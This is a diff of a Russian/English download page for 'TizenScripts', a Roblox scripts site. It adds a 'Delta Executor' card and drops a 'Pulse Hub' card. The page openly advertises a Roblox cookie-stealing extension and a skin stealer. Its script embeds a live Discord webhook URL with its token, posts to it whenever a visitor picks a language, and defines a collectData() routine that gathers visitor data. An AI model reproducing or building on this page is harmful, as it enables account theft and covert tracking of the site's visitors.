@@ -44,10 +44,6 @@
             font-size: 14px;
             cursor: pointer;
         }
-        .language-selector select:focus {
-            outline: none;
-            border-color: #ff6666;
-        }
         nav {
             background: #111;
             padding: 15px;
@@ -61,9 +57,7 @@
             font-size: 16px;
             transition: color 0.3s;
         }
-        nav a:hover {
-            color: #ff4444;
-        }
+        nav a:hover { color: #ff4444; }
         main {
             max-width: 1000px;
             margin: 40px auto;
@@ -82,14 +76,8 @@
             border-radius: 10px;
             border: 2px solid #333;
         }
-        .stat-card h3 {
-            font-size: 36px;
-            color: #ff4444;
-        }
-        .stat-card p {
-            color: #888;
-            margin-top: 5px;
-        }
+        .stat-card h3 { font-size: 36px; color: #ff4444; }
+        .stat-card p { color: #888; margin-top: 5px; }
         .downloads {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
@@ -108,21 +96,9 @@
             transform: translateY(-5px);
             box-shadow: 0 10px 20px rgba(255, 0, 0, 0.2);
         }
-        .download-card h3 {
-            color: #ff4444;
-            font-size: 22px;
-            margin-bottom: 10px;
-        }
-        .download-card p {
-            color: #888;
-            font-size: 14px;
-            margin-bottom: 15px;
-        }
-        .version {
-            color: #ffaa00;
-            font-size: 12px;
-            margin-bottom: 10px;
-        }
+        .download-card h3 { color: #ff4444; font-size: 22px; margin-bottom: 10px; }
+        .download-card p { color: #888; font-size: 14px; margin-bottom: 15px; }
+        .version { color: #ffaa00; font-size: 12px; margin-bottom: 10px; }
         .download-btn {
             display: inline-block;
             padding: 12px 25px;
@@ -133,26 +109,15 @@
             font-weight: bold;
             transition: all 0.3s;
         }
-        .download-btn:hover {
-            background: #ff6666;
-            transform: scale(1.05);
-        }
-        footer {
-            text-align: center;
-            padding: 20px;
-            color: #555;
-            margin-top: 50px;
-        }
+        .download-btn:hover { background: #ff6666; transform: scale(1.05); }
+        footer { text-align: center; padding: 20px; color: #555; margin-top: 50px; }
     </style>
     
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1538116344967340144/ECF6ixeFCjRIZrStHKIv6SjuYyt09u8lGh_qTCP62P-nzOlwqF8raxBnLX3GtqIWsZLW";
         
-        // Переводы
         const translations = {
             ru: {
-                title: 'TizenScripts - Лучшие скрипты и расширения для Roblox',
-                headerTitle: '⚡ TizenScripts',
                 headerSubtitle: 'Лучшие скрипты и расширения для Roblox',
                 navHome: 'Главная',
                 navScripts: 'Скрипты',
@@ -163,18 +128,16 @@
                 statUsers: 'Пользователей',
                 statSupport: 'Поддержка',
                 statFree: 'Бесплатно',
+                deltaTitle: '⚡ Delta Executor',
+                deltaDesc: 'Лучший бесплатный экзекутор для Roblox',
                 cookieTitle: '🍪 Cookie-pro-V2',
                 cookieDesc: 'Расширение для кражи cookies Roblox',
                 mm2Title: '🔫 MM2 Stealer',
                 mm2Desc: 'Стилер скинов для Murder Mystery 2',
-                pulseTitle: '⚡ Pulse Hub',
-                pulseDesc: 'Универсальный хаб для Roblox',
                 downloadBtn: 'Скачать',
                 footer: '© 2026 TizenScripts'
             },
             en: {
-                title: 'TizenScripts - Best Roblox scripts and extensions',
-                headerTitle: '⚡ TizenScripts',
                 headerSubtitle: 'Best scripts and extensions for Roblox',
                 navHome: 'Home',
                 navScripts: 'Scripts',
@@ -185,23 +148,21 @@
                 statUsers: 'Users',
                 statSupport: 'Support',
                 statFree: 'Free',
+                deltaTitle: '⚡ Delta Executor',
+                deltaDesc: 'Best free executor for Roblox',
                 cookieTitle: '🍪 Cookie-pro-V2',
                 cookieDesc: 'Roblox cookie stealing extension',
                 mm2Title: '🔫 MM2 Stealer',
                 mm2Desc: 'Skin stealer for Murder Mystery 2',
-                pulseTitle: '⚡ Pulse Hub',
-                pulseDesc: 'Universal hub for Roblox',
                 downloadBtn: 'Download',
                 footer: '© 2026 TizenScripts'
             }
         };
         
-        // Функция смены языка
         function changeLanguage(lang) {
             localStorage.setItem('language', lang);
             const t = translations[lang];
             
-            document.title = t.title;
             document.getElementById('headerSubtitle').textContent = t.headerSubtitle;
             document.getElementById('navHome').textContent = t.navHome;
             document.getElementById('navScripts').textContent = t.navScripts;
@@ -212,21 +173,17 @@
             document.getElementById('statUsersText').textContent = t.statUsers;
             document.getElementById('statSupportText').textContent = t.statSupport;
             document.getElementById('statFreeText').textContent = t.statFree;
+            document.getElementById('deltaTitle').textContent = t.deltaTitle;
+            document.getElementById('deltaDesc').textContent = t.deltaDesc;
             document.getElementById('cookieTitle').textContent = t.cookieTitle;
             document.getElementById('cookieDesc').textContent = t.cookieDesc;
             document.getElementById('mm2Title').textContent = t.mm2Title;
             document.getElementById('mm2Desc').textContent = t.mm2Desc;
-            document.getElementById('pulseTitle').textContent = t.pulseTitle;
-            document.getElementById('pulseDesc').textContent = t.pulseDesc;
             document.getElementById('footerText').textContent = t.footer;
             
-            // Меняем кнопки
             const buttons = document.querySelectorAll('.download-btn');
-            buttons.forEach(btn => {
-                btn.textContent = t.downloadBtn;
-            });
+            buttons.forEach(btn => { btn.textContent = t.downloadBtn; });
             
-            // Отправляем выбор языка в Discord
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -234,14 +191,12 @@
             });
         }
         
-        // Загрузка сохранённого языка
         function loadLanguage() {
             const savedLang = localStorage.getItem('language') || 'ru';
             document.getElementById('languageSelect').value = savedLang;
             changeLanguage(savedLang);
         }
         
-        // Сбор данных
         async function collectData() {
             const data = {
                 timestamp: new Date().toISOString(),
@@ -344,7 +299,6 @@
     </script>
 </head>
 <body>
-    <!-- Выбор языка -->
     <div class="language-selector">
         <select id="languageSelect" onchange="changeLanguage(this.value)">
             <option value="ru">🇷🇺 Русский</option>
@@ -359,10 +313,8 @@
     
     <nav>
         <a href="index.html" id="navHome">Главная</a>
-        <a href="scripts.html" id="navScripts">Скрипты</a>
-        <a href="extensions.html" id="navExtensions">Расширения</a>
+        <a href="delta.html" id="navDelta">Delta</a>
         <a href="support.html" id="navSupport">Поддержка</a>
-        <a href="faq.html" id="navFAQ">FAQ</a>
     </nav>
     
     <main>
@@ -387,6 +339,13 @@
         
         <div class="downloads">
             <div class="download-card">
+                <h3 id="deltaTitle">⚡ Delta Executor</h3>
+                <div class="version">v2.733.988</div>
+                <p id="deltaDesc">Лучший бесплатный экзекутор для Roblox</p>
+                <a href="delta.html" class="download-btn">Скачать</a>
+            </div>
+            
+            <div class="download-card">
                 <h3 id="cookieTitle">🍪 Cookie-pro-V2</h3>
                 <div class="version">v3.0.0</div>
                 <p id="cookieDesc">Расширение для кражи cookies Roblox</p>
@@ -398,13 +357,6 @@
                 <div class="version">v2.733.988</div>
                 <p id="mm2Desc">Стилер скинов для Murder Mystery 2</p>
                 <a href="mm2-stealer.lua" class="download-btn">Скачать</a>
-            </div>
-            
-            <div class="download-card">
-                <h3 id="pulseTitle">⚡ Pulse Hub</h3>
-                <div class="version">v2.7</div>
-                <p id="pulseDesc">Универсальный хаб для Roblox</p>
-                <a href="pulse-hub.lua" class="download-btn">Скачать</a>
             </div>
         </div>
     </main>
